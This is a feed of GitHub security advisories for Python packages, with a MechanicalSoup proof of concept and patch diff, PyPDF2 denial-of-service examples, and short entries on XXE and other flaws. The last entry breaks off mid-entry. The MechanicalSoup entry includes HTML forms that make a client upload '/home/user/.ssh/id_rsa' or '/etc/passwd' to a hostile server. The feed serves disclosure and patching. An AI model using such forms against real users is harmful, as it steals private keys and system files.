<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2023-07-05T22:01:36.901Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[MechanicalSoup] MechanicalSoup vulnerable to malicious web server reading arbitrary files on client using file input inside HTML form]]></title>
        <id>https://github.com/advisories/GHSA-x456-3ccm-m6j4</id>
        <link href="https://github.com/advisories/GHSA-x456-3ccm-m6j4"/>
        <updated>2023-07-05T21:35:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A malicious web server can read arbitrary files on the client using a <code>&lt;input type="file" ...&gt;</code> inside HTML form.</p>
<h3 id="details">Details</h3>
<p>This affects the extremely common pattern of form submission:</p>
<pre><code class="language-python">b = mechanicalsoup.StatefulBrowser()
b.select_form(...)
b.submit_selected()
</code></pre>
<p>The problem is with the code in <code>browser.Browser.get_request_kwargs</code>:</p>
<pre><code class="language-python">    if tag.get("type", "").lower() == "file" and multipart:
        filepath = value
        if filepath != "" and isinstance(filepath, str):
            content = open(filepath, "rb")
        else:
            content = ""
        filename = os.path.basename(filepath)
        # If value is the empty string, we still pass it
        # for consistency with browsers (see
        # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
        files[name] = (filename, content)
</code></pre>
<p>The file path is taken from the bs4 tag "value" attribute. However, this path will default to whatever the server sends. So if a malicious web server were to send something like:</p>
<pre><code class="language-html">&lt;html&gt;&lt;body&gt;
  &lt;form method="post" enctype="multipart/form-data"&gt;
    &lt;input type="text" name="greeting" value="hello" /&gt;
    &lt;input type="file" name="evil" value="/home/user/.ssh/id_rsa" /&gt;
  &lt;/form&gt;
&lt;/body&gt;&lt;/html&gt;
</code></pre>
<p>then upon <code>.submit_selected()</code> the mechanicalsoup browser will happily send over the contents of your SSH private key.</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-python">import attr
import mechanicalsoup
import requests


class NevermindError(Exception):
    pass


@attr.s
class FakeSession:
    session = attr.ib()

    headers = property(lambda self: self.session.headers)

    def request(self, *args, **kwargs):
        print("requested", args, kwargs)
        raise NevermindError  # don't actually send request


def demonstrate(inputs=None):
    b = mechanicalsoup.StatefulBrowser(FakeSession(requests.Session()))
    b.open_fake_page("""\
&lt;html&gt;&lt;body&gt;
&lt;form method="post" enctype="multipart/form-data"&gt;
&lt;input type="text" name="greeting" value="hello" /&gt;
&lt;input type="file" name="evil" value="/etc/passwd" /&gt;
&lt;input type="file" name="second" /&gt;
&lt;/form&gt;
&lt;/body&gt;&lt;/html&gt;
""", url="http://127.0.0.1:9/")
    b.select_form()
    if inputs is not None:
        b.form.set_input(inputs)
    try:
        b.submit_selected()
    except NevermindError:
        pass

# %%

# unpatched
demonstrate()
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('passwd', &lt;_io.BufferedReader name='/etc/passwd'&gt;), 'second': ('', '')}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hello')]}

# %%

# with the patch, this now works. users MUST open the file manually and
# use browser.set_input() using the file object.
demonstrate({"greeting": "hiya", "evil": open("/etc/hostname", "rb").name, "second": open("/dev/null", "rb")})
# OUTPUT: requested () {'method': 'post', 'url': 'http://127.0.0.1:9/', 'files': {'evil': ('hostname', &lt;_io.BufferedReader name='/etc/hostname'&gt;), 'second': ('null', &lt;_io.BufferedReader name='/dev/null'&gt;)}, 'headers': {'Referer': 'http://127.0.0.1:9/'}, 'data': [('greeting', 'hiya')]}

# %%

# with the patch, this raises a ValueError with a helpful string
demonstrate({"evil": "/etc/hostname"})

# %%

# with the patch, we silently send no file if a malicious server tries the attack:
demonstrate()
</code></pre>
<h3 id="suggested-patch">Suggested patch</h3>
<pre><code class="language-diff">diff --git a/mechanicalsoup/browser.py b/mechanicalsoup/browser.py
index 285f8bb..68bc65e 100644
--- a/mechanicalsoup/browser.py
+++ b/mechanicalsoup/browser.py
@@ -1,7 +1,8 @@
+import io
 import os
 import tempfile
 import urllib
 import weakref
 import webbrowser
 
 import bs4
@@ -227,15 +228,21 @@ class Browser:
                     value = tag.get("value", "")
 
                 # If the enctype is not multipart, the filename is put in
                 # the form as a text input and the file is not sent.
                 if tag.get("type", "").lower() == "file" and multipart:
                     filepath = value
                     if filepath != "" and isinstance(filepath, str):
-                        content = open(filepath, "rb")
+                        content = getattr(tag, "_mechanicalsoup_file", None)
+                        if content is False:
+                            raise ValueError(
+                                """From v1.3.0 onwards, you must pass an open file object directly, for example using `form.set_input({"name": open("/path/to/filename", "rb")})`. This change is to mitigate a security vulnerability where a malicious web server could read arbitrary files from the client."""
+                            )
+                        elif not isinstance(content, io.IOBase):
+                            content = ""
                     else:
                         content = ""
                     filename = os.path.basename(filepath)
                     # If value is the empty string, we still pass it
                     # for consistency with browsers (see
                     # https://github.com/MechanicalSoup/MechanicalSoup/issues/250).
                     files[name] = (filename, content)
diff --git a/mechanicalsoup/form.py b/mechanicalsoup/form.py
index a67195c..82f6015 100644
--- a/mechanicalsoup/form.py
+++ b/mechanicalsoup/form.py
@@ -1,8 +1,9 @@
 import copy
+import io
 import warnings
 
 from bs4 import BeautifulSoup
 
 from .utils import LinkNotFoundError
 
 
@@ -64,15 +65,24 @@ class Form:
         give it the value ``password``.
         """
 
         for (name, value) in data.items():
             i = self.form.find("input", {"name": name})
             if not i:
                 raise InvalidFormMethod("No input field named " + name)
-            i["value"] = value
+
+            if isinstance(value, io.IOBase):
+                # Store the actual file object for &lt;input type="file"&gt;
+                i._mechanicalsoup_file = value
+                i["value"] = value.name
+            else:
+                # We set `_mechanicalsoup_file` to `False` so that we can
+                # check for deprecated use of the API.
+                i._mechanicalsoup_file = False
+                i["value"] = value
 
     def uncheck_all(self, name):
         """Remove the *checked*-attribute of all input elements with
         a *name*-attribute given by ``name``.
         """
         for option in self.form.find_all("input", {"name": name}):
             if "checked" in option.attrs:
@@ -257,20 +267,20 @@ class Form:
         .. code-block:: python
 
             form.set("login", username)
             form.set("password", password)
             form.set("eula-checkbox", True)
 
         Example: uploading a file through a ``&lt;input type="file"
-        name="tagname"&gt;`` field (provide the path to the local file,
+        name="tagname"&gt;`` field (provide an open file object,
         and its content will be uploaded):
 
         .. code-block:: python
 
-            form.set("tagname", path_to_local_file)
+            form.set("tagname", open(path_to_local_file, "rb"))
 
         """
         for func in ("checkbox", "radio", "input", "textarea", "select"):
             try:
                 getattr(self, "set_" + func)({name: value})
                 return
             except InvalidFormMethod:
</code></pre>
<h3 id="impact">Impact</h3>
<p>All users of MechanicalSoup's form submission are affected, unless they took very specific (and manual) steps to reset HTML form field values.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4">https://github.com/MechanicalSoup/MechanicalSoup/security/advisories/GHSA-x456-3ccm-m6j4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-34457">https://nvd.nist.gov/vuln/detail/CVE-2023-34457</a></li>
<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e">https://github.com/MechanicalSoup/MechanicalSoup/commit/d57c4a269bba3b9a0c5bfa20292955b849006d9e</a></li>
<li><a href="https://github.com/MechanicalSoup/MechanicalSoup/releases/tag/v1.3.0">https://github.com/MechanicalSoup/MechanicalSoup/releases/tag/v1.3.0</a></li>
<li><a href="https://github.com/advisories/GHSA-x456-3ccm-m6j4">https://github.com/advisories/GHSA-x456-3ccm-m6j4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x456-3ccm-m6j4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-07-05T21:35:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[petl] XML Injection in petl]]></title>
        <id>https://github.com/advisories/GHSA-69q2-p9xp-739v</id>
        <link href="https://github.com/advisories/GHSA-69q2-p9xp-739v"/>
        <updated>2023-07-05T21:07:37.000Z</updated>
        <content type="html"><![CDATA[<p>petl before 1.68, in some configurations, allows resolution of entities in an XML document.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/petl-developers/petl/security/advisories/GHSA-f5gc-p5m3-v347">https://github.com/petl-developers/petl/security/advisories/GHSA-f5gc-p5m3-v347</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-29128">https://nvd.nist.gov/vuln/detail/CVE-2020-29128</a></li>
<li><a href="https://github.com/petl-developers/petl/issues/526">https://github.com/petl-developers/petl/issues/526</a></li>
<li><a href="https://github.com/petl-developers/petl/pull/527">https://github.com/petl-developers/petl/pull/527</a></li>
<li><a href="https://github.com/petl-developers/petl/pull/527/commits/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8">https://github.com/petl-developers/petl/pull/527/commits/1b0a09f08c3cdfe2e69647bd02f97c1367a5b5f8</a></li>
<li><a href="https://github.com/nvn1729/advisories/blob/master/cve-2020-29128.md">https://github.com/nvn1729/advisories/blob/master/cve-2020-29128.md</a></li>
<li><a href="https://github.com/petl-developers/petl/compare/v1.6.7...v1.6.8">https://github.com/petl-developers/petl/compare/v1.6.7...v1.6.8</a></li>
<li><a href="https://petl.readthedocs.io/en/stable/changes.html">https://petl.readthedocs.io/en/stable/changes.html</a></li>
<li><a href="https://github.com/advisories/GHSA-69q2-p9xp-739v">https://github.com/advisories/GHSA-69q2-p9xp-739v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-69q2-p9xp-739v</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2021-04-20T16:32:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[grpcio] Connection confusion in gRPC]]></title>
        <id>https://github.com/advisories/GHSA-cfgp-2977-2fmm</id>
        <link href="https://github.com/advisories/GHSA-cfgp-2977-2fmm"/>
        <updated>2023-07-05T20:26:49.000Z</updated>
        <content type="html"><![CDATA[<p>When gRPC HTTP2 stack raised a header size exceeded error, it skipped parsing the rest of the HPACK frame. This caused any HPACK table mutations to also be skipped, resulting in a desynchronization of HPACK tables between sender and receiver. If leveraged, say, between a proxy and a backend, this could lead to requests from the proxy being interpreted as containing headers from different proxy clients - leading to an information leak that can be used for privilege escalation or data exfiltration. We recommend upgrading beyond the commit contained in&nbsp; <a href="https://github.com/grpc/grpc/pull/32309">https://github.com/grpc/grpc/pull/32309</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-32731">https://nvd.nist.gov/vuln/detail/CVE-2023-32731</a></li>
<li><a href="https://github.com/grpc/grpc/pull/32309">https://github.com/grpc/grpc/pull/32309</a></li>
<li><a href="https://github.com/grpc/grpc/pull/33005">https://github.com/grpc/grpc/pull/33005</a></li>
<li><a href="https://github.com/advisories/GHSA-cfgp-2977-2fmm">https://github.com/advisories/GHSA-cfgp-2977-2fmm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cfgp-2977-2fmm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-07-05T19:12:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[request-util] Forwarding of confidentials headers to third parties in fluture-node]]></title>
        <id>https://github.com/advisories/GHSA-32x6-qvw6-mxj4</id>
        <link href="https://github.com/advisories/GHSA-32x6-qvw6-mxj4"/>
        <updated>2023-07-05T17:01:30.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Using <code>followRedirects</code> or <code>followRedirectsWith</code> with any of the redirection strategies built into fluture-node 4.0.0 or 4.0.1, paired with a request that includes confidential headers such as Authorization or Cookie, exposes you to a vulnerability where, if the destination server were to redirect the request to a server on a third-party domain, or the same domain over unencrypted HTTP, the headers would be included in the follow-up request and be exposed to the third party, or potential http traffic sniffing.</p>
<h3 id="patches">Patches</h3>
<p>The redirection strategies made available in version 4.0.2 automatically redact confidential headers when a redirect is followed across to another origin.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Use a custom redirection strategy via the <code>followRedirectsWith</code> function. The custom strategy can be based on the new strategies available in <a href="mailto:fluture-node@4.0.2">fluture-node@4.0.2</a>.</p>
<h3 id="references">References</h3>
<ul>
<li>This vulnerability was discovered after the announcement of similar vulnerabilities in the <code>follow-redirects</code> package. There is more information there: <a href="https://github.com/advisories/GHSA-74fj-2j2h-c42q">https://github.com/advisories/GHSA-74fj-2j2h-c42q</a> and <a href="https://huntr.dev/bounties/7cf2bf90-52da-4d59-8028-a73b132de0db/">https://huntr.dev/bounties/7cf2bf90-52da-4d59-8028-a73b132de0db/</a></li>
<li>Fixed in 125e4474f910c1507f8ec3232848626fbc0f55c4 and 0c99bc511533d48be17dc6bfe641f7d0aeb34d77</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluture-js/fluture-node/security/advisories/GHSA-32x6-qvw6-mxj4">https://github.com/fluture-js/fluture-node/security/advisories/GHSA-32x6-qvw6-mxj4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24719">https://nvd.nist.gov/vuln/detail/CVE-2022-24719</a></li>
<li><a href="https://github.com/psf/requests/pull/4718">https://github.com/psf/requests/pull/4718</a></li>
<li><a href="https://github.com/fluture-js/fluture-node/commit/0c99bc511533d48be17dc6bfe641f7d0aeb34d77">https://github.com/fluture-js/fluture-node/commit/0c99bc511533d48be17dc6bfe641f7d0aeb34d77</a></li>
<li><a href="https://github.com/fluture-js/fluture-node/commit/125e4474f910c1507f8ec3232848626fbc0f55c4">https://github.com/fluture-js/fluture-node/commit/125e4474f910c1507f8ec3232848626fbc0f55c4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/request-util/PYSEC-2022-43052.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/request-util/PYSEC-2022-43052.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-32x6-qvw6-mxj4">https://github.com/advisories/GHSA-32x6-qvw6-mxj4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-32x6-qvw6-mxj4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-03-01T22:14:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyPDF2] PyPDF2 vulnerable to possible Infinite Loop when reading malformed objects]]></title>
        <id>https://github.com/advisories/GHSA-hm9v-vj3r-r55m</id>
        <link href="https://github.com/advisories/GHSA-hm9v-vj3r-r55m"/>
        <updated>2023-06-30T22:19:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop.
This infinite loop blocks the current process and can utilize a single core of the CPU by 100%. It does not affect memory usage. That is, for example, the case if the user extracted metadata from such a malformed PDF.</p>
<h3 id="patches">Patches</h3>
<p>The issue was fixed with <a href="https://github.com/py-pdf/pypdf/pull/1331">https://github.com/py-pdf/pypdf/pull/1331</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot update your version of <code>PyPDF2</code> (preferably to <code>pypdf&gt;3.1.0</code> as PyPDF2 is deprecated), you should modify <code>PyPDF2/generic/_data_structures.py::read_object</code>.</p>
<p>Replace:</p>
<pre><code class="language-python">    else:
        # number object OR indirect reference
        peek = stream.read(20)
        stream.seek(-len(peek), 1)  # reset to start
        if IndirectPattern.match(peek) is not None:
            return IndirectObject.read_from_stream(stream, pdf)
        else:
            return NumberObject.read_from_stream(stream)
</code></pre>
<p>by</p>
<pre><code class="language-python">    elif tok in b"0123456789+-.":
        # number object OR indirect reference
        peek = stream.read(20)
        stream.seek(-len(peek), 1)  # reset to start
        if IndirectPattern.match(peek) is not None:
            return IndirectObject.read_from_stream(stream, pdf)
        else:
            return NumberObject.read_from_stream(stream)
    else:
        raise PdfReadError(
            f"Invalid Elementary Object starting with {tok} @{stream.tell()}"
        )
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/issues/1329">pypdf issue #1329</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/1331">pypdf PR #1331</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-hm9v-vj3r-r55m">https://github.com/py-pdf/pypdf/security/advisories/GHSA-hm9v-vj3r-r55m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36807">https://nvd.nist.gov/vuln/detail/CVE-2023-36807</a></li>
<li><a href="https://github.com/py-pdf/pypdf/issues/1329">https://github.com/py-pdf/pypdf/issues/1329</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/1331">https://github.com/py-pdf/pypdf/pull/1331</a></li>
<li><a href="https://github.com/py-pdf/pypdf/commit/e6531a25325e7e0174b6a1ba03b57320b5227f6b">https://github.com/py-pdf/pypdf/commit/e6531a25325e7e0174b6a1ba03b57320b5227f6b</a></li>
<li><a href="https://github.com/advisories/GHSA-hm9v-vj3r-r55m">https://github.com/advisories/GHSA-hm9v-vj3r-r55m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hm9v-vj3r-r55m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T22:19:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyPDF2] PyPDF2 quadratic runtime with malformed PDF missing xref marker]]></title>
        <id>https://github.com/advisories/GHSA-jrm6-h9cq-8gqw</id>
        <link href="https://github.com/advisories/GHSA-jrm6-h9cq-8gqw"/>
        <updated>2023-06-30T22:17:53.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to unexpected long runtime.
This quadratic runtime blocks the current process and can utilize a single core of the CPU by 100%. It does not affect memory usage.</p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/py-pdf/pypdf/pull/808">https://github.com/py-pdf/pypdf/pull/808</a></p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/pull/808">PyPDF2 PR #808</a></li>
<li><a href="https://github.com/py-pdf/pypdf/issues/582">PyPDF2 Issue #582</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/py-pdf/pypdf/security/advisories/GHSA-jrm6-h9cq-8gqw">https://github.com/py-pdf/pypdf/security/advisories/GHSA-jrm6-h9cq-8gqw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36810">https://nvd.nist.gov/vuln/detail/CVE-2023-36810</a></li>
<li><a href="https://github.com/py-pdf/pypdf/issues/582">https://github.com/py-pdf/pypdf/issues/582</a></li>
<li><a href="https://github.com/py-pdf/pypdf/pull/808">https://github.com/py-pdf/pypdf/pull/808</a></li>
<li><a href="https://github.com/py-pdf/pypdf/commit/c6c56f550bb384e05f0139c796ba1308837d6373">https://github.com/py-pdf/pypdf/commit/c6c56f550bb384e05f0139c796ba1308837d6373</a></li>
<li><a href="https://github.com/advisories/GHSA-jrm6-h9cq-8gqw">https://github.com/advisories/GHSA-jrm6-h9cq-8gqw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jrm6-h9cq-8gqw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T22:17:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hnswlib] hnswlib Double Free vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-xwc8-rf6m-xr86</id>
        <link href="https://github.com/advisories/GHSA-xwc8-rf6m-xr86"/>
        <updated>2023-06-30T22:12:53.000Z</updated>
        <content type="html"><![CDATA[<p>Hnswlib 0.7.0 has a double free in <code>init_index</code> when the M argument is a large integer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37365">https://nvd.nist.gov/vuln/detail/CVE-2023-37365</a></li>
<li><a href="https://github.com/nmslib/hnswlib/issues/467">https://github.com/nmslib/hnswlib/issues/467</a></li>
<li><a href="https://github.com/advisories/GHSA-xwc8-rf6m-xr86">https://github.com/advisories/GHSA-xwc8-rf6m-xr86</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xwc8-rf6m-xr86</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T21:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pipreqs] pipreqs vulnerable to Dependency Confusion]]></title>
        <id>https://github.com/advisories/GHSA-v4f4-23wc-99mh</id>
        <link href="https://github.com/advisories/GHSA-v4f4-23wc-99mh"/>
        <updated>2023-06-30T22:12:38.000Z</updated>
        <content type="html"><![CDATA[<p>A dependency confusion in pipreqs v0.3.0 to v0.4.11 allows attackers to execute arbitrary code via uploading a crafted PyPI package to the chosen repository server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-31543">https://nvd.nist.gov/vuln/detail/CVE-2023-31543</a></li>
<li><a href="https://github.com/bndr/pipreqs/pull/364">https://github.com/bndr/pipreqs/pull/364</a></li>
<li><a href="https://gist.github.com/adeadfed/ccc834440af354a5638f889bee34bafe">https://gist.github.com/adeadfed/ccc834440af354a5638f889bee34bafe</a></li>
<li><a href="https://github.com/bndr/pipreqs/commit/3f5964fcb90ec6eb6df46d78e651a1b73538d0ba">https://github.com/bndr/pipreqs/commit/3f5964fcb90ec6eb6df46d78e651a1b73538d0ba</a></li>
<li><a href="https://github.com/bndr/pipreqs/blob/master/pipreqs/pipreqs.py#L447-L449">https://github.com/bndr/pipreqs/blob/master/pipreqs/pipreqs.py#L447-L449</a></li>
<li><a href="https://github.com/advisories/GHSA-v4f4-23wc-99mh">https://github.com/advisories/GHSA-v4f4-23wc-99mh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v4f4-23wc-99mh</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-30T21:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-jdbc] Apache Airflow JDBC Provider Improper Input Validation vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-mm87-c3x2-6f89</id>
        <link href="https://github.com/advisories/GHSA-mm87-c3x2-6f89"/>
        <updated>2023-06-30T20:40:05.000Z</updated>
        <content type="html"><![CDATA[<p>Improper Input Validation vulnerability in Apache Software Foundation Apache Airflow JDBC Provider. Airflow JDBC Provider Connection’s [Connection URL] parameters had no restrictions, which made it possible to implement RCE attacks via different type JDBC drivers, obtain airflow server permission. This issue affects Apache Airflow JDBC Provider: before 4.0.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-22886">https://nvd.nist.gov/vuln/detail/CVE-2023-22886</a></li>
<li><a href="https://lists.apache.org/thread/ynbjwp4n0vzql0xzhog1gkp1ovncf8j3">https://lists.apache.org/thread/ynbjwp4n0vzql0xzhog1gkp1ovncf8j3</a></li>
<li><a href="https://github.com/advisories/GHSA-mm87-c3x2-6f89">https://github.com/advisories/GHSA-mm87-c3x2-6f89</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mm87-c3x2-6f89</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-29T12:30:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[easy-parse] easy-parse XML External Entity Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-vv6q-6hwp-vrgp</id>
        <link href="https://github.com/advisories/GHSA-vv6q-6hwp-vrgp"/>
        <updated>2023-06-30T20:36:48.000Z</updated>
        <content type="html"><![CDATA[<p>easy-parse v0.1.1 was discovered to contain a XML External Entity Injection (XXE) vulnerability which allows attackers to execute arbitrary code via a crafted XML file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26710">https://nvd.nist.gov/vuln/detail/CVE-2020-26710</a></li>
<li><a href="https://github.com/uncmath25/easy-parse/issues/3">https://github.com/uncmath25/easy-parse/issues/3</a></li>
<li><a href="https://github.com/advisories/GHSA-vv6q-6hwp-vrgp">https://github.com/advisories/GHSA-vv6q-6hwp-vrgp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vv6q-6hwp-vrgp</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-29T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[py-xml] py-xml XML External Entity Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-j6v2-mwxm-f952</id>
        <link href="https://github.com/advisories/GHSA-j6v2-mwxm-f952"/>
        <updated>2023-06-30T20:36:38.000Z</updated>
        <content type="html"><![CDATA[<p>py-xml v1.0 was discovered to contain an XML External Entity Injection (XXE) vulnerability which allows attackers to execute arbitrary code via a crafted XML file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26709">https://nvd.nist.gov/vuln/detail/CVE-2020-26709</a></li>
<li><a href="https://github.com/PinaeOS/py-xml/issues/2">https://github.com/PinaeOS/py-xml/issues/2</a></li>
<li><a href="https://github.com/advisories/GHSA-j6v2-mwxm-f952">https://github.com/advisories/GHSA-j6v2-mwxm-f952</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j6v2-mwxm-f952</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-29T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[requests-xml] requests-xml XML External Entity Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-ccrc-9x59-3vc4</id>
        <link href="https://github.com/advisories/GHSA-ccrc-9x59-3vc4"/>
        <updated>2023-06-30T20:36:28.000Z</updated>
        <content type="html"><![CDATA[<p>requests-xml v0.2.3 was discovered to contain an XML External Entity Injection (XXE) vulnerability which allows attackers to execute arbitrary code via a crafted XML file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26708">https://nvd.nist.gov/vuln/detail/CVE-2020-26708</a></li>
<li><a href="https://github.com/erinxocon/requests-xml/issues/7">https://github.com/erinxocon/requests-xml/issues/7</a></li>
<li><a href="https://github.com/advisories/GHSA-ccrc-9x59-3vc4">https://github.com/advisories/GHSA-ccrc-9x59-3vc4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ccrc-9x59-3vc4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-29T21:30:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[PyPDF2] pypdf and PyPDF2 possible Infinite Loop when a comment isn't followed by a character]]></title>
        <id>https://github.com/advisories/GHSA-4vvm-4w3v-6mr8</id>
        <link href="https://github.com/advisories/GHSA-4vvm-4w3v-6mr8"/>
        <updated>2023-06-30T20:33:59.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop if <code>__parse_content_stream</code> is executed. This infinite loop blocks the current process and can utilize a single core of the CPU by 100%. It does not affect memory usage. That is, for example, the case if the user extracted text from such a PDF.</p>
<p>Example Code and a PDF that causes the issue:</p>
<pre><code class="language-python">from pypdf import PdfReader

# https://objects.githubusercontent.com/github-production-repository-file-5c1aeb/3119517/11367871?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20230627%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20230627T201018Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=d71c8fd9181c4875f0c04d563b6d32f1d4da6e7b2e6be2f14479ce4ecdc9c8b2&amp;X-Amz-SignedHeaders=host&amp;actor_id=1658117&amp;key_id=0&amp;repo_id=3119517&amp;response-content-disposition=attachment%3Bfilename%3DMiFO_LFO_FEIS_NOA_Published.3.pdf&amp;response-content-type=application%2Fpdf
reader = PdfReader("MiFO_LFO_FEIS_NOA_Published.3.pdf")
page = reader.pages[0]
page.extract_text()
</code></pre>
